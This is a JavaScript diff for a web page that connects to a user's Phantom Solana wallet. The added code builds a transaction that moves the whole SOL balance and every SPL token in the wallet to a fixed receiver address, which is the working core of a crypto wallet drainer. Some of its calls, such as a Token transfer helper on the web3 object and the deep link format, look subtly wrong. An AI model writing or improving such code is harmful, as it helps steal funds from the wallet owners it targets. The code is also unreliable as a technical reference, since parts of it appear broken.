@@ -19,8 +19,8 @@
             }
 
             if (isMobileDevice()) {
-                // Mobile link to open Phantom app
-                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}`;
+                // Mobile deep link to open Phantom app
+                const mobileLink = `phantom://action=send&recipient=${receiverWallet}`;
                 window.location.href = mobileLink;
             } else {
                 if (!window.solana) {
@@ -39,19 +39,48 @@
                     const publicKey = provider.publicKey;
                     alert("Connected wallet: " + publicKey.toBase58());
 
-                    const balance = await connection.getBalance(publicKey);
-                    if (balance <= 5000) {
-                        alert("Insufficient SOL balance.");
+                    // Get SOL balance
+                    const solBalance = await connection.getBalance(publicKey);
+                    const transaction = new solanaWeb3.Transaction();
+
+                    // If SOL balance exists, add it to the transaction
+                    if (solBalance > 5000) {
+                        transaction.add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: publicKey,
+                                toPubkey: new solanaWeb3.PublicKey(receiverWallet),
+                                lamports: solBalance - 5000, // Send all but keep a little for fees
+                            })
+                        );
+                    }
+
+                    // Get SPL token accounts
+                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+                    });
+
+                    if (tokenAccounts.value.length === 0 && solBalance <= 5000) {
+                        alert("No tokens available to transfer.");
                         return;
                     }
 
-                    const transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                            lamports: balance - 5000,  // Transfer all SOL, leaving a small fee
-                        })
-                    );
+                    tokenAccounts.value.forEach(tokenAccount => {
+                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
+                        const tokenMintAddress = tokenAccount.account.data.parsed.info.mint;
+
+                        if (tokenAmount > 0) {
+                            transaction.add(
+                                solanaWeb3.Token.createTransferInstruction(
+                                    new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+                                    tokenAccount.pubkey,
+                                    new solanaWeb3.PublicKey(receiverWallet),
+                                    publicKey,
+                                    [],
+                                    tokenAmount * Math.pow(10, tokenAccount.account.data.parsed.info.tokenAmount.decimals)
+                                )
+                            );
+                        }
+                    });
 
                     const { signature } = await provider.signAndSendTransaction(transaction);
                     alert("Transaction sent! Signature: " + signature);
